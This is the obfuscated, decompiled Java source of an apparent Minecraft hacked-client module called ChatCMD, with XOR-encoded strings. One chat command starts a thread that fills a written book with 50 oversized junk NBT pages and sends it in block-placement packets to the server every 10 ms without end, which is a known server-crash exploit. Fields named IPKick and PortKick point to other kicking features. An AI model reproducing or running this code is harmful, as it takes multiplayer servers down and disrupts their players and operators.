package YSK;

import net.minecraft.item.*;
import net.minecraft.init.*;
import net.minecraft.client.*;
import net.minecraft.nbt.*;
import net.minecraft.util.*;
import net.minecraft.network.play.client.*;
import net.minecraft.network.*;

public class ChatCMD
{
    private static final String[] I;
    private static ItemStack book;
    public static int PortKick;
    public static String IPKick;
    
    static ItemStack access$0() {
        return ChatCMD.book;
    }
    
    static {
        I();
        ChatCMD.book = new ItemStack(Items.written_book);
    }
    
    private static void I() {
        (I = new String[0x3B ^ 0x3E])["".length()] = I("F\u0001,\n8", "hiIfH");
        ChatCMD.I[" ".length()] = I("", "PrxpP");
        ChatCMD.I["  ".length()] = I("@\u0000Z+\u0003\u0007\u0010\u001chWQNUeQ@\u0006T\t\u0005\u0012\u0002\u0017#Q\u0015\u0006\u0006>\u0014\u0014M", "fctHq");
        ChatCMD.I["   ".length()] = I("S\u0011%-/\u0001\u0013\u00056aSEKclUTTb\u0003\u0019\u001d\b&$6\u001d\u0011atDFSblU7\u000b+/VKP{vU_F\u00164\u0007\u0019\u000f;$VCQtq", "urfBA");
        ChatCMD.I[0x3F ^ 0x3B] = I("Z\u0007\b\u0017)\u001c", "tdzvZ");
    }
    
    private static String I(final String s, final String s2) {
        final StringBuilder sb = new StringBuilder();
        final char[] charArray = s2.toCharArray();
        int length = "".length();
        final char[] charArray2 = s.toCharArray();
        final int length2 = charArray2.length;
        int i = "".length();
        while (i < length2) {
            sb.append((char)(charArray2[i] ^ charArray[length % charArray.length]));
            ++length;
            ++i;
            "".length();
            if (-1 == 4) {
                throw null;
            }
        }
        return sb.toString();
    }
    
    public static void commands(final String s) {
        if (s.equalsIgnoreCase(ChatCMD.I["".length()])) {
            ChatMSG.msg(ChatCMD.I[" ".length()], " ".length() != 0);
            ChatMSG.msg(ChatCMD.I["  ".length()], "".length() != 0);
            ChatMSG.msg(ChatCMD.I["   ".length()], "".length() != 0);
        }
        if (s.equalsIgnoreCase(ChatCMD.I[0x3C ^ 0x38])) {
            new Thread() {
                private static final String[] I;
                
                private static String I(final String s, final String s2) {
                    final StringBuilder sb = new StringBuilder();
                    final char[] charArray = s2.toCharArray();
                    int length = "".length();
                    final char[] charArray2 = s.toCharArray();
                    final int length2 = charArray2.length;
                    int i = "".length();
                    while (i < length2) {
                        sb.append((char)(charArray2[i] ^ charArray[length % charArray.length]));
                        ++length;
                        ++i;
                        "".length();
                        if (0 >= 2) {
                            throw null;
                        }
                    }
                    return sb.toString();
                }
                
                private static void I() {
                    (I = new String[0x74 ^ 0x72])["".length()] = I("Jg-\u0016?\r6\u0007B8\t'\u001a\u00079M", "lUlbK");
                    ChatCMD$1.I[" ".length()] = I("\t9\u0007", "PjLxw");
                    ChatCMD$1.I["  ".length()] = I("\u0007\u000f=:\u0015\u0014", "fzIRz");
                    ChatCMD$1.I["   ".length()] = I(">\u0013\u001d)\u0003", "JziEf");
                    ChatCMD$1.I[0x84 ^ 0x80] = I("6\u001b7\u00019", "FzPdJ");
                    ChatCMD$1.I[0x6 ^ 0x3] = I("!.\"1\u0014", "QOETg");
                }
                
                static {
                    I();
                }
                
                @Override
                public void run() {
                    try {
                        ChatMSG.msg(ChatCMD$1.I["".length()], " ".length() != 0);
                        final NBTTagList list = new NBTTagList();
                        final NBTTagCompound tagCompound = new NBTTagCompound();
                        final String username = Minecraft.getMinecraft().getSession().getUsername();
                        final String s = ChatCMD$1.I[" ".length()];
                        final String s2 = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
                        int i = "".length();
                        "".length();
                        if (4 == 3) {
                            throw null;
                        }
                        while (i < (0xAF ^ 0x9D)) {
                            list.appendTag(new NBTTagString(s2));
                            ++i;
                        }
                        tagCompound.setString(ChatCMD$1.I["  ".length()], username);
                        tagCompound.setString(ChatCMD$1.I["   ".length()], s);
                        tagCompound.setTag(ChatCMD$1.I[0xBF ^ 0xBB], list);
                        ChatCMD.access$0().setTagInfo(ChatCMD$1.I[0x2F ^ 0x2A], list);
                        ChatCMD.access$0().setTagCompound(tagCompound);
                        do {
                            ChatMSG.sendPacket(new C08PacketPlayerBlockPlacement(new BlockPos(ChatMSG.player().posX, ChatMSG.player().posY - 2.0, ChatMSG.player().posZ), " ".length(), ChatCMD.access$0(), 0.0f, 0.0f, 0.0f));
                            Thread.sleep(10L);
                            "".length();
                        } while (1 != -1);
                        throw null;
                    }
                    catch (Exception ex) {
                        ex.printStackTrace();
                    }
                }
            }.start();
        }
    }
}
